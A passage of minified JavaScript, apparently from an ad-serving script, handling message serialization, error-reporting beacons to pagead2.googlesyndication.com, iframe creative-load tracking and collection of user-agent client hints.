      return c.join("");
    }
    ;
    var Da = "undefined" !== typeof Uint8Array,
      Ea = !Aa && "function" === typeof btoa;
    var H = "function" === typeof Symbol && "symbol" === typeof Symbol() ? Symbol() : void 0,
      Fa = H ? function (a, b) {
        a[H] |= b;
      } : function (a, b) {
        void 0 !== a.g ? a.g |= b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ga(a) {
      var b = J(a);
      1 !== (b & 1) && (Object.isFrozen(a) && (a = Array.prototype.slice.call(a)), K(a, b | 1));
    }
    var J = H ? function (a) {
        return a[H] | 0;
      } : function (a) {
        return a.g | 0;
      },
      M = H ? function (a) {
        return a[H];
      } : function (a) {
        return a.g;
      },
      K = H ? function (a, b) {
        a[H] = b;
      } : function (a, b) {
        void 0 !== a.g ? a.g = b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ha() {
      var a = [];
      Fa(a, 1);
      return a;
    }
    function Ia(a) {
      a = a >> 11 & 1023;
      return 0 === a ? 536870912 : a;
    }
    ;
    var Ja = {};
    function N(a) {
      return null !== a && "object" === typeof a && !Array.isArray(a) && a.constructor === Object;
    }
    var Ka,
      O,
      La = [];
    K(La, 39);
    O = Object.freeze(La);
    function Ma(a) {
      if ("boolean" !== typeof a) {
        var b = typeof a;
        throw Error("Expected boolean but got " + ("object" != b ? b : a ? Array.isArray(a) ? "array" : b : "null") + ": " + a);
      }
      return !!a;
    }
    ;
    var Na;
    function P(a, b, c) {
      null == a && (a = Na);
      Na = void 0;
      if (null == a) {
        var d = 96;
        c ? (a = [c], d |= 512) : a = [];
        b && (d = d & -2095105 | (b & 1023) << 11);
      } else {
        if (!Array.isArray(a)) throw Error();
        d = J(a);
        if (d & 64) return a;
        d |= 64;
        if (c && (d |= 512, c !== a[0])) throw Error();
        a: {
          c = a;
          var e = c.length;
          if (e) {
            var f = e - 1,
              g = c[f];
            if (N(g)) {
              d |= 256;
              b = +!!(d & 512) - 1;
              e = f - b;
              1024 <= e && (Oa(c, b, g), e = 1023);
              d = d & -2095105 | (e & 1023) << 11;
              break a;
            }
          }
          b && (g = +!!(d & 512) - 1, b = Math.max(b, e - g), 1024 < b && (Oa(c, g, {}), d |= 256, b = 1023), d = d & -2095105 | (b & 1023) << 11);
        }
      }
      K(a, d);
      return a;
    }
    function Oa(a, b, c) {
      for (var d = 1023 + b, e = a.length, f = d; f < e; f++) {
        var g = a[f];
        null != g && g !== c && (c[f - b] = g);
      }
      a.length = d + 1;
      a[d] = c;
    }
    ;
    function Pa(a, b) {
      return Qa(b);
    }
    function Qa(a) {
      switch (typeof a) {
        case "number":
          return isFinite(a) ? a : String(a);
        case "boolean":
          return a ? 1 : 0;
        case "object":
          if (a && !Array.isArray(a) && Da && null != a && a instanceof Uint8Array) {
            if (Ea) {
              for (var b = "", c = 0, d = a.length - 10240; c < d;) b += String.fromCharCode.apply(null, a.subarray(c, c += 10240));
              b += String.fromCharCode.apply(null, c ? a.subarray(c) : a);
              a = btoa(b);
            } else a = Ca(a);
            return a;
          }
      }
      return a;
    }
    ;
    function Ra(a, b, c, d, e, f) {
      if (null != a) {
        if (Array.isArray(a)) a = e && 0 == a.length && J(a) & 1 ? void 0 : f && J(a) & 2 ? a : Sa(a, b, c, void 0 !== d, e, f);else if (N(a)) {
          var g = {},
            h;
          for (h in a) g[h] = Ra(a[h], b, c, d, e, f);
          a = g;
        } else a = b(a, d);
        return a;
      }
    }
    function Sa(a, b, c, d, e, f) {
      var g = d || c ? J(a) : 0;
      d = d ? !!(g & 32) : void 0;
      a = Array.prototype.slice.call(a);
      for (var h = 0; h < a.length; h++) a[h] = Ra(a[h], b, c, d, e, f);
      c && c(g, a);
      return a;
    }
    function Ta(a) {
      return a.Z === Ja ? a.toJSON() : Qa(a);
    }
    ;
    function Ua(a, b, c) {
      var d = a.l,
        e = M(d);
      if (e & 2) throw Error();
      Va(d, e, b, c);
      return a;
    }
    function Va(a, b, c, d) {
      var e = Ia(b);
      if (c >= e) {
        var f = b;
        if (b & 256) e = a[a.length - 1];else {
          if (null == d) return;
          e = a[e + (+!!(b & 512) - 1)] = {};
          f |= 256;
        }
        e[c] = d;
        f !== b && K(a, f);
      } else a[c + (+!!(b & 512) - 1)] = d, b & 256 && (a = a[a.length - 1], c in a && delete a[c]);
    }
    function Q(a, b, c) {
      if (null != c && "string" !== typeof c) throw Error();
      return Ua(a, b, c);
    }
    ;
    function R(a, b, c) {
      this.l = P(a, b, c);
    }
    R.prototype.toJSON = function () {
      if (Ka) var a = Wa(this, this.l, !1);else a = Sa(this.l, Ta, void 0, void 0, !1, !1), a = Wa(this, a, !0);
      return a;
    };
    function Xa(a) {
      Ka = !0;
      try {
        return JSON.stringify(a.toJSON(), Pa);
      } finally {
        Ka = !1;
      }
    }
    R.prototype.Z = Ja;
    R.prototype.toString = function () {
      return Wa(this, this.l, !1).toString();
    };
    function Wa(a, b, c) {
      var d = a.constructor.aa,
        e = Ia(M(c ? a.l : b)),
        f = !1;
      if (d) {
        if (!c) {
          b = Array.prototype.slice.call(b);
          var g;
          if (b.length && N(g = b[b.length - 1])) for (f = 0; f < d.length; f++) if (d[f] >= e) {
            Object.assign(b[b.length - 1] = {}, g);
            break;
          }
          f = !0;
        }
        e = b;
        c = !c;
        g = M(a.l);
        a = Ia(g);
        g = +!!(g & 512) - 1;
        for (var h, k, l = 0; l < d.length; l++) if (k = d[l], k < a) {
          k += g;
          var n = e[k];
          null == n ? e[k] = c ? O : Ha() : c && n !== O && Ga(n);
        } else h || (n = void 0, e.length && N(n = e[e.length - 1]) ? h = n : e.push(h = {})), n = h[k], null == h[k] ? h[k] = c ? O : Ha() : c && n !== O && Ga(n);
      }
      d = b.length;
      if (!d) return b;
      var p;
      if (N(h = b[d - 1])) {
        a: {
          var q = h;
          e = {};
          c = !1;
          for (var v in q) a = q[v], Array.isArray(a) && a != a && (c = !0), null != a ? e[v] = a : c = !0;
          if (c) {
            for (var t in e) {
              q = e;
              break a;
            }
            q = null;
          }
        }
        q != h && (p = !0);
        d--;
      }
      for (; 0 < d; d--) {
        h = b[d - 1];
        if (null != h) break;
        var y = !0;
      }
      if (!p && !y) return b;
      var w;
      f ? w = b : w = Array.prototype.slice.call(b, 0, d);
      b = w;
      f && (b.length = d);
      q && b.push(q);
      return b;
    }
    ;
    function Ya(a) {
      this.l = P(a);
    }
    u(Ya, R);
    function Za(a, b) {
      this.key = a;
      this.defaultValue = void 0 === b ? !1 : b;
      this.valueType = "boolean";
    }
    ;
    var $a = new Za("100000"),
      ab = new Za("45357156", !0),
      bb = new Za("45350890"),
      cb = new Za("45414892");
    var db = ["A7CQXglZzTrThjGTBEn1rWTxHOEtkWivwzgea+NjyardrwlieSjVuyG44PkYgIPGs8Q9svD8sF3Yedn0BBBjXAkAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="];
    function eb(a, b) {
      return "&adurl=" == a.substring(a.length - 7) ? a.substring(0, a.length - 7) + b + "&adurl=" : a + b;
    }
    ;
    function S(a) {
      return a = void 0 === a ? window : a;
    }
    ;
    var T = x.dicnf || {};
    function fb(a) {
      var b = !1,
        c;
      return function () {
        b || (c = a(), b = !0);
        return c;
      };
    }
    ;
    function gb(a, b, c) {
      a.addEventListener && a.addEventListener(b, c, !1);
    }
    function hb(a, b, c) {
      a.removeEventListener && a.removeEventListener(b, c, !1);
    }
    ;
    var ib = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");
    function jb(a, b, c, d) {
      for (var e = c.length; 0 <= (b = a.indexOf(c, b)) && b < d;) {
        var f = a.charCodeAt(b - 1);
        if (38 == f || 63 == f) if (f = a.charCodeAt(b + e), !f || 61 == f || 38 == f || 35 == f) return b;
        b += e + 1;
      }
      return -1;
    }
    var kb = /#|$/,
      lb = /[?&]($|#)/;
    function mb(a) {
      try {
        var b;
        if (b = !!a && null != a.location.href) a: {
          try {
            za(a.foo);
            b = !0;
            break a;
          } catch (c) {}
          b = !1;
        }
        return b;
      } catch (c) {
        return !1;
      }
    }
    function nb(a, b) {
      b = void 0 === b ? !1 : b;
      var c = void 0 === c ? x : c;
      for (var d = 0; c && 40 > d++ && (!b && !mb(c) || !a(c));) a: {
        try {
          var e = c.parent;
          if (e && e != c) {
            c = e;
            break a;
          }
        } catch (f) {}
        c = null;
      }
    }
    function ob() {
      if (!globalThis.crypto) return Math.random();
      try {
        var a = new Uint32Array(1);
        globalThis.crypto.getRandomValues(a);
        return a[0] / 65536 / 65536;
      } catch (b) {
        return Math.random();
      }
    }
    function pb(a, b) {
      if (a) for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(a[c], c, a);
    }
    var qb = [];
    function rb() {
      var a = qb;
      qb = [];
      a = ea(a);
      for (var b = a.next(); !b.done; b = a.next()) {
        b = b.value;
        try {
          b();
        } catch (c) {}
      }
    }
    function sb(a, b) {
      "complete" === a.readyState || "interactive" === a.readyState ? (qb.push(b), 1 == qb.length && (window.Promise ? Promise.resolve().then(rb) : window.setImmediate ? setImmediate(rb) : setTimeout(rb, 0))) : a.addEventListener("DOMContentLoaded", b);
    }
    function tb(a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    }
    ;
    function U(a, b, c, d) {
      ub(x, a, void 0 === b ? null : b, !1, void 0 === c ? !1 : c, void 0 === d ? !1 : d);
    }
    function ub(a, b, c, d, e, f) {
      f = void 0 === f ? !1 : f;
      a.google_image_requests || (a.google_image_requests = []);
      var g = tb("IMG", a.document);
      if (c || e) {
        var h = function (k) {
          c && c(k);
          if (e) {
            k = a.google_image_requests;
            var l = xa(k, g);
            0 <= l && Array.prototype.splice.call(k, l, 1);
          }
          hb(g, "load", h);
          hb(g, "error", h);
        };
        gb(g, "load", h);
        gb(g, "error", h);
      }
      d && (g.referrerPolicy = "no-referrer");
      f && (g.attributionSrc = "");
      g.src = b;
      a.google_image_requests.push(g);
    }
    var vb = fb(function () {
      return "referrerPolicy" in tb("IMG");
    });
    function wb() {
      this.g = {};
    }
    function V(a) {
      xb || (xb = new yb());
      var b = xb.g[a.key];
      if ("proto" === a.valueType) {
        try {
          var c = JSON.parse(b);
          if (Array.isArray(c)) return c;
        } catch (d) {}
        return a.defaultValue;
      }
      return typeof b === typeof a.defaultValue ? b : a.defaultValue;
    }
    ;
    function yb() {
      this.g = {};
      var a = document.currentScript;
      a = (a = (a = void 0 === a ? null : a) && "0" === a.getAttribute("data-jc") ? a : document.querySelector('[data-jc="0"]')) && a.getAttribute("data-jc-flags") || "";
      try {
        var b = JSON.parse(a)[0];
        a = "";
        for (var c = 0; c < b.length; c++) a += String.fromCharCode(b.charCodeAt(c) ^ "\u0003\u0007\u0003\u0007\b\u0004\u0004\u0006\u0005\u0003".charCodeAt(c % 10));
        this.g = JSON.parse(a);
      } catch (d) {}
    }
    var xb;
    u(yb, wb);
    function zb(a, b) {
      var c = void 0 === c ? {} : c;
      this.error = a;
      this.context = b.context;
      this.msg = b.message || "";
      this.id = b.id || "jserror";
      this.meta = c;
    }
    ;
    var Bb = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)");
    function Cb(a, b) {
      this.g = a;
      this.h = b;
    }
    function Db(a, b) {
      this.url = a;
      this.R = !!b;
      this.depth = null;
    }
    ;
    var Eb = null;
    function Fb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now && a.timing ? Math.floor(a.now() + a.timing.navigationStart) : Date.now();
    }
    function Gb() {
      var a = void 0 === a ? x : a;
      return (a = a.performance) && a.now ? a.now() : null;
    }
    ;
    function Hb(a, b) {
      var c = Gb() || Fb();
      this.label = a;
      this.type = b;
      this.value = c;
      this.duration = 0;
      this.taskId = this.slotId = void 0;
      this.uniqueId = Math.random();
    }
    ;
    var W = x.performance,
      Ib = !!(W && W.mark && W.measure && W.clearMarks),
      X = fb(function () {
        var a;
        if (a = Ib) {
          var b;
          if (null === Eb) {
            Eb = "";
            try {
              a = "";
              try {
                a = x.top.location.hash;
              } catch (c) {
                a = x.location.hash;
              }
              a && (Eb = (b = a.match(/\bdeid=([\d,]+)/)) ? b[1] : "");
            } catch (c) {}
          }
          b = Eb;
          a = !!b.indexOf && 0 <= b.indexOf("1337");
        }
        return a;
      });
    function Jb() {
      var a = window;
      this.h = [];
      this.i = a || x;
      var b = null;
      a && (a.google_js_reporting_queue = a.google_js_reporting_queue || [], this.h = a.google_js_reporting_queue, b = a.google_measure_js_timing);
      this.g = X() || (null != b ? b : 1 > Math.random());
    }
    function Kb(a) {
      a && W && X() && (W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_start"), W.clearMarks("goog_" + a.label + "_" + a.uniqueId + "_end"));
    }
    Jb.prototype.start = function (a, b) {
      if (!this.g) return null;
      a = new Hb(a, b);
      b = "goog_" + a.label + "_" + a.uniqueId + "_start";
      W && X() && W.mark(b);
      return a;
    };
    Jb.prototype.end = function (a) {
      if (this.g && "number" === typeof a.value) {
        a.duration = (Gb() || Fb()) - a.value;
        var b = "goog_" + a.label + "_" + a.uniqueId + "_end";
        W && X() && W.mark(b);
        !this.g || 2048 < this.h.length || this.h.push(a);
      }
    };
    function Lb() {
      this.i = "&";
      this.h = {};
      this.j = 0;
      this.g = [];
    }
    function Mb(a, b) {
      var c = {};
      c[a] = b;
      return [c];
    }
    function Nb(a, b, c, d, e) {
      var f = [];
      pb(a, function (g, h) {
        (g = Ob(g, b, c, d, e)) && f.push(h + "=" + g);
      });
      return f.join(b);
    }
    function Ob(a, b, c, d, e) {
      if (null == a) return "";
      b = b || "&";
      c = c || ",$";
      "string" == typeof c && (c = c.split(""));
      if (a instanceof Array) {
        if (d = d || 0, d < c.length) {
          for (var f = [], g = 0; g < a.length; g++) f.push(Ob(a[g], b, c, d + 1, e));
          return f.join(c[d]);
        }
      } else if ("object" == typeof a) return e = e || 0, 2 > e ? encodeURIComponent(Nb(a, b, c, d, e + 1)) : "...";
      return encodeURIComponent(String(a));
    }
    function Pb(a, b) {
      var c = "https://pagead2.googlesyndication.com" + b,
        d = Qb(a) - b.length;
      if (0 > d) return "";
      a.g.sort(function (n, p) {
        return n - p;
      });
      b = null;
      for (var e = "", f = 0; f < a.g.length; f++) for (var g = a.g[f], h = a.h[g], k = 0; k < h.length; k++) {
        if (!d) {
          b = null == b ? g : b;
          break;
        }
        var l = Nb(h[k], a.i, ",$");
        if (l) {
          l = e + l;
          if (d >= l.length) {
            d -= l.length;
            c += l;
            e = a.i;
            break;
          }
          b = null == b ? g : b;
        }
      }
      a = "";
      null != b && (a = e + "trn=" + b);
      return c + a;
    }
    function Qb(a) {
      var b = 1,
        c;
      for (c in a.h) b = c.length > b ? c.length : b;
      return 3997 - b - a.i.length - 1;
    }
    ;
    function Rb() {
      var a = Sb;
      this.m = Tb;
      this.g = void 0 === a ? null : a;
      this.h = null;
      this.i = !1;
      this.o = this.j;
    }
    function Ub(a) {
      var b = Vb;
      try {
        if (b.g && b.g.g) {
          var c = b.g.start(903 .toString(), 3);
          var d = a();
          b.g.end(c);
        } else d = a();
      } catch (g) {
        a = !0;
        try {
          Kb(c), a = b.o(903, new zb(g, {
            message: Wb(g)
          }), void 0, void 0);
        } catch (h) {
          b.j(217, h);
        }
        if (a) {
          var e, f;
          null == (e = window.console) || null == (f = e.error) || f.call(e, g);
        } else throw g;
      }
      return d;
    }
    function Xb(a) {
      return function () {
        var b = pa.apply(0, arguments);
        return Ub(function () {
          return a.apply(void 0, b);
        });
      };
    }
    Rb.prototype.j = function (a, b, c, d, e) {
      e = e || "jserror";
      try {
        var f = new Lb();
        f.g.push(1);
        f.h[1] = Mb("context", a);
        b.error && b.meta && b.id || (b = new zb(b, {
          message: Wb(b)
        }));
        if (b.msg) {
          var g = b.msg.substring(0, 512);
          f.g.push(2);
          f.h[2] = Mb("msg", g);
        }
        var h = b.meta || {};
        if (this.h) try {
          this.h(h);
        } catch (ja) {}
        if (d) try {
          d(h);
        } catch (ja) {}
        b = [h];
        f.g.push(3);
        f.h[3] = b;
        d = x;
        b = [];
        g = null;
        do {
          var k = d;
          if (mb(k)) {
            var l = k.location.href;
            g = k.document && k.document.referrer || null;
          } else l = g, g = null;
          b.push(new Db(l || ""));
          try {
            d = k.parent;
          } catch (ja) {
            d = null;
          }
        } while (d && k != d);
        l = 0;
        for (var n = b.length - 1; l <= n; ++l) b[l].depth = n - l;
        k = x;
        if (k.location && k.location.ancestorOrigins && k.location.ancestorOrigins.length == b.length - 1) for (n = 1; n < b.length; ++n) {
          var p = b[n];
          p.url || (p.url = k.location.ancestorOrigins[n - 1] || "", p.R = !0);
        }
        var q = new Db(x.location.href, !1);
        k = null;
        var v = b.length - 1;
        for (p = v; 0 <= p; --p) {
          var t = b[p];
          !k && Bb.test(t.url) && (k = t);
          if (t.url && !t.R) {
            q = t;
            break;
          }
        }
        t = null;
        var y = b.length && b[v].url;
        0 != q.depth && y && (t = b[v]);
        var w = new Cb(q, t);
        if (w.h) {
          var r = w.h.url || "";
          f.g.push(4);
          f.h[4] = Mb("top", r);
        }
        var I = {
          url: w.g.url || ""
        };
        if (w.g.url) {
          var L = w.g.url.match(ib),
            C = L[1],
            D = L[3],
            ka = L[4];
          q = "";
          C && (q += C + ":");
          D && (q += "//", q += D, ka && (q += ":" + ka));
          var Ab = q;
        } else Ab = "";
        I = [I, {
          url: Ab
        }];
        f.g.push(5);
        f.h[5] = I;
        Yb(this.m, e, f, this.i, c);
      } catch (ja) {
        try {
          Yb(this.m, e, {
            context: "ecmserr",
            rctx: a,
            msg: Wb(ja),
            url: w && w.g.url
          }, this.i, c);
        } catch (id) {}
      }
      return !0;
    };
    function Wb(a) {
      var b = a.toString();
      a.name && -1 == b.indexOf(a.name) && (b += ": " + a.name);
      a.message && -1 == b.indexOf(a.message) && (b += ": " + a.message);
      if (a.stack) {
        a = a.stack;
        var c = b;
        try {
          -1 == a.indexOf(c) && (a = c + "\n" + a);
          for (var d; a != d;) d = a, a = a.replace(RegExp("((https?:/..*/)[^/:]*:\\d+(?:.|\n)*)\\2"), "$1");
          b = a.replace(RegExp("\n *", "g"), "\n");
        } catch (e) {
          b = c;
        }
      }
      return b;
    }
    ;
    function Zb(a) {
      var b = "J";
      if (a.J && a.hasOwnProperty(b)) return a.J;
      b = new a();
      return a.J = b;
    }
    ;
    function $b() {}
    ;
    function ac() {
      this.g = Math.random();
    }
    function bc() {
      var a = Tb,
        b = window.google_srt;
      0 <= b && 1 >= b && (a.g = b);
    }
    function Yb(a, b, c, d, e) {
      if (((void 0 === d ? 0 : d) ? a.g : Math.random()) < (e || .01)) try {
        if (c instanceof Lb) var f = c;else f = new Lb(), pb(c, function (h, k) {
          var l = f,
            n = l.j++;
          h = Mb(k, h);
          l.g.push(n);
          l.h[n] = h;
        });
        var g = Pb(f, "/pagead/gen_204?id=" + b + "&");
        g && U(g);
      } catch (h) {}
    }
    ;
    var Tb,
      Vb,
      Sb = new Jb();
    function cc() {
      if (!window.google_measure_js_timing) {
        var a = Sb;
        a.g = !1;
        a.h != a.i.google_js_reporting_queue && (X() && ya(a.h, Kb), a.h.length = 0);
      }
    }
    (function (a) {
      Tb = null != a ? a : new ac();
      "number" !== typeof window.google_srt && (window.google_srt = Math.random());
      bc();
      Vb = new Rb();
      Vb.h = function () {};
      Vb.i = !0;
      "complete" == window.document.readyState ? cc() : Sb.g && gb(window, "load", function () {
        cc();
      });
    })();
    var dc = ["FRAME", "IMG", "IFRAME"],
      ec = /^[01](px)?$/;
    function fc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function gc(a, b, c, d, e, f, g) {
      c = void 0 === c ? !0 : c;
      d = void 0 === d ? !1 : d;
      f = void 0 === f ? !1 : f;
      g = void 0 === g ? !1 : g;
      if (a = fc(a)) {
        e || (e = function (C, D, ka) {
          C.addEventListener(D, ka);
        });
        for (var h = !1, k = function (C) {
            h || (h = !0, b(C));
          }, l, n, p = 0; p < dc.length; ++p) if (dc[p] == a.tagName) {
          n = 3;
          l = [a];
          break;
        }
        l || (l = a.querySelectorAll(dc.join(",")), n = 2);
        var q = 0,
          v = 0,
          t = !g,
          y = a = !1;
        p = {};
        for (var w = 0; w < l.length; p = {
          v: p.v
        }, w++) {
          var r = l[w];
          if (!("IMG" == r.tagName && (r.complete && (!r.naturalWidth || !r.naturalHeight) || (void 0 === g ? 0 : g) && r.style && "none" === r.style.display) || ec.test(r.getAttribute("width")) && ec.test(r.getAttribute("height")))) {
            p.v = "IMG" === r.tagName;
            if ("IMG" == r.tagName) var I = r.naturalWidth && r.naturalHeight ? !0 : !1;else try {
              I = "complete" === (r.readyState ? r.readyState : r.contentWindow && r.contentWindow.document && r.contentWindow.document.readyState) ? !0 : !1;
            } catch (C) {
              I = void 0 === d ? !1 : d;
            }
            if (I) a = !0, p.v && (t = !0);else {
              q++;
              var L = function (C) {
                return function (D) {
                  q--;
                  !q && t && k(n);
                  C.v && (D = D && "error" === D.type, v--, D || (t = !0), !v && y && t && k(n));
                };
              }(p);
              e(r, "load", L);
              p.v && (v++, e(r, "error", L));
            }
          }
        }
        0 === v && (t = !0);
        l = null;
        if (0 === q && !a && "complete" === x.document.readyState) n = 5;else if (q || !a) {
          e(x, "load", function () {
            !f || !v && t ? k(4) : y = !0;
          });
          return;
        }
        c && k(n);
      }
    }
    ;
    function hc(a, b, c) {
      if (a) for (var d = 0; null != a && 500 > d && !c(a); ++d) a = b(a);
    }
    function ic(a, b) {
      hc(a, function (c) {
        try {
          return c === c.parent ? null : c.parent;
        } catch (d) {}
        return null;
      }, b);
    }
    function jc(a, b) {
      if ("IFRAME" == a.tagName) b(a);else {
        a = a.querySelectorAll("IFRAME");
        for (var c = 0; c < a.length && !b(a[c]); ++c);
      }
    }
    function kc(a) {
      return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
    }
    function lc(a, b, c) {
      try {
        var d = JSON.parse(c.data);
      } catch (g) {}
      if ("object" === typeof d && d && "creativeLoad" === d.type) {
        var e = kc(a);
        if (c.source && e) {
          var f;
          ic(c.source, function (g) {
            try {
              if (g.parent === e) return f = g, !0;
            } catch (h) {}
          });
          f && jc(a, function (g) {
            if (g.contentWindow === f) return b(d), !0;
          });
        }
      }
    }
    function mc(a) {
      return "string" === typeof a ? document.getElementById(a) : a;
    }
    function nc(a, b) {
      var c = mc(a);
      if (c) if (c.onCreativeLoad) c.onCreativeLoad(b);else {
        var d = b ? [b] : [],
          e = function (f) {
            for (var g = 0; g < d.length; ++g) try {
              d[g](1, f);
            } catch (h) {}
            d = {
              push: function (h) {
                h(1, f);
              }
            };
          };
        c.onCreativeLoad = function (f) {
          d.push(f);
        };
        c.setAttribute("data-creative-load-listener", "");
        c.addEventListener("creativeLoad", function (f) {
          e(f.detail);
        });
        x.addEventListener("message", function (f) {
          lc(c, e, f);
        });
      }
    }
    ;
    function Y(a) {
      var b = this;
      this.h = !1;
      this.g = [];
      a(function (c) {
        oc(b, c);
      });
    }
    function oc(a, b) {
      if (!a.h) if (b instanceof Y) b.then(function (c) {
        oc(a, c);
      });else {
        a.h = !0;
        a.i = b;
        for (b = 0; b < a.g.length; ++b) pc(a, a.g[b]);
        a.g = [];
      }
    }
    function pc(a, b) {
      a.h ? b(a.i) : a.g.push(b);
    }
    Y.prototype.then = function (a) {
      var b = this;
      return new Y(function (c) {
        pc(b, function (d) {
          c(a(d));
        });
      });
    };
    function qc(a) {
      var b = a.length,
        c = 0;
      return new Y(function (d) {
        if (0 == b) d([]);else for (var e = [], f = {
            s: 0
          }; f.s < b; f = {
          s: f.s
        }, ++f.s) a[f.s].then(function (g) {
          return function (h) {
            e[g.s] = h;
            ++c == b && d(e);
          };
        }(f));
      });
    }
    function rc() {
      var a,
        b = new Y(function (c) {
          a = c;
        });
      return new sc(b, a);
    }
    function sc(a, b) {
      this.promise = a;
      this.resolve = b;
    }
    ;
    function tc(a) {
      return a.prerendering ? 3 : {
        visible: 1,
        hidden: 2,
        prerender: 3,
        preview: 4,
        unloaded: 5
      }[a.visibilityState || a.webkitVisibilityState || a.mozVisibilityState || ""] || 0;
    }
    function uc(a) {
      var b;
      a.visibilityState ? b = "visibilitychange" : a.mozVisibilityState ? b = "mozvisibilitychange" : a.webkitVisibilityState && (b = "webkitvisibilitychange");
      return b;
    }
    ;
    function vc(a, b, c) {
      function d(k) {
        try {
          var l = "object" === typeof k.data ? k.data : JSON.parse(k.data);
          g === l.paw_id && (window.clearTimeout(h), window.removeEventListener("message", d), l.signal ? b(l.signal) : l.error && c(l.error));
        } catch (n) {
          k = {
            msg: "postmessageError",
            err: n instanceof Error ? n.message : "nonError",
            data: null == k.data ? "null" : 500 < k.data.length ? k.data.substring(0, 500) : k.data
          }, Zb($b), l = [], !k.eid && l.length && (k.eid = l.toString()), Yb(Tb, "paw_sigs", k, !0);
        }
      }
      var e = {},
        f = 200;
      e = void 0 === e ? {} : e;
      b = void 0 === b ? function () {} : b;
      c = void 0 === c ? function () {} : c;
      f = void 0 === f ? 200 : f;
      var g = String(Math.floor(2147483647 * ob())),
        h = 0;
      window.addEventListener("message", function (k) {
        Xb(function () {
          d(k);
        })();
      });
      a.postMessage(Object.assign({}, {
        paw_id: g
      }, e));
      h = window.setTimeout(function () {
        window.removeEventListener("message", d);
        c("PAW GMA postmessage timed out.");
      }, f);
    }
    function wc() {
      var a = window,
        b,
        c;
      if (a.gmaSdk || (null == (b = a.webkit) ? 0 : null == (c = b.messageHandlers) ? 0 : c.getGmaViewSignals)) return a;
      try {
        var d = window.parent,
          e,
          f;
        if (d.gmaSdk || (null == (e = d.webkit) ? 0 : null == (f = e.messageHandlers) ? 0 : f.getGmaViewSignals)) return d;
      } catch (g) {}
      return null;
    }
    ;
    function xc(a) {
      this.l = P(a);
    }
    u(xc, R);
    function yc(a) {
      this.l = P(a);
    }
    u(yc, R);
    function zc(a, b) {
      return Q(a, 2, b);
    }
    function Ac(a, b) {
      return Q(a, 3, b);
    }
    function Bc(a, b) {
      return Q(a, 4, b);
    }
    function Cc(a, b) {
      return Q(a, 5, b);
    }
    function Dc(a, b) {
      return Q(a, 9, b);
    }
    function Ec(a, b) {
      var c = b;
      b = a.l;
      var d = M(b);
      if (d & 2) throw Error();
      if (null != c) {
        for (var e = !!c.length, f = 0; f < c.length; f++) {
          var g = c[f];
          e = e && !(J(g.l) & 2);
        }
        g = J(c);
        f = g | 1;
        f = (e ? f | 8 : f & -9) | 4;
        f != g && (Object.isFrozen(c) && (c = Array.prototype.slice.call(c)), K(c, f));
      }
      null == c && (c = void 0);
      Va(b, d, 10, c);
      return a;
    }
    function Fc(a, b) {
      return Ua(a, 11, null == b ? b : Ma(b));
    }
    function Gc(a, b) {
      return Q(a, 1, b);
    }
    function Hc(a, b) {
      return Ua(a, 7, null == b ? b : Ma(b));
    }
    yc.aa = [10, 6];
    var Ic = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
    function Jc(a) {
      var b;
      return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
    }
    function Kc(a) {
      var b, c;
      return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
    }
    function Lc(a) {
      if (!Kc(a)) return null;
      var b = Jc(a);
      if (b.uach_promise) return b.uach_promise;
      a = a.navigator.userAgentData.getHighEntropyValues(Ic).then(function (c) {
        null != b.uach || (b.uach = c);
        return c;
      });
      return b.uach_promise = a;
    }
    function Mc(a) {
      var b;
      return Fc(Ec(Cc(zc(Gc(Bc(Hc(Dc(Ac(new yc(), a.architecture || ""), a.bitness || ""), a.mobile || !1), a.model || ""), a.platform || ""), a.platformVersion || ""), a.uaFullVersion || ""), (null == (b = a.fullVersionList) ? void 0 : b.map(function (c) {
        var d = new xc();
        d = Q(d, 1, c.brand);
        return Q(d, 2, c.version);
      })) || []), a.wow64 || !1);
    }
    function Nc(a) {
      var b, c;
      return null != (c = null == (b = Lc(a)) ? void 0 : b.then(function (d) {
        return Mc(d);
      })) ? c : null;
    }
    ;
    function Oc(a) {
      return ["omid_v1_present", "omid_v1_present_web", "omid_v1_present_app"].some(function (b) {
        try {
          var c = a.frames && !!a.frames[b];
        } catch (d) {
          c = !1;
        }
        return c;
      });
    }
    ;
    function Pc() {
      this.g = x.document;
      this.u = x;
      this.h = null;
      this.i = this.j = "";
      this.m = Qc();
      Rc(this);
    }
    function Rc(a) {
      var b = [],
        c = V(bb) || !!T.aub;
      if (c || T.aunb) {
        var d = Nc(a.u);
        d && (d = d.then(function (p) {
          p = Xa(p);
          for (var q = [], v = 0, t = 0; t < p.length; t++) {
            var y = p.charCodeAt(t);
            255 < y && (q[v++] = y & 255, y >>= 8);
            q[v++] = y;
          }
          p = Ca(q, 3);
          a.j = p;
        }), c && b.push(d));
      }
      if (V(ab) || V(cb)) {
        c = wc();
        var e;
        if (null == c ? 0 : null == (e = c.gmaSdk) ? 0 : e.getViewSignals) (e = c.gmaSdk.getViewSignals()) && !V(cb) && (a.i = "&ms=" + e);else {
          var f, g;
          if (null == c ? 0 : null == (f = c.webkit) ? 0 : null == (g = f.messageHandlers) ? 0 : g.getGmaViewSignals) {
            var h, k;
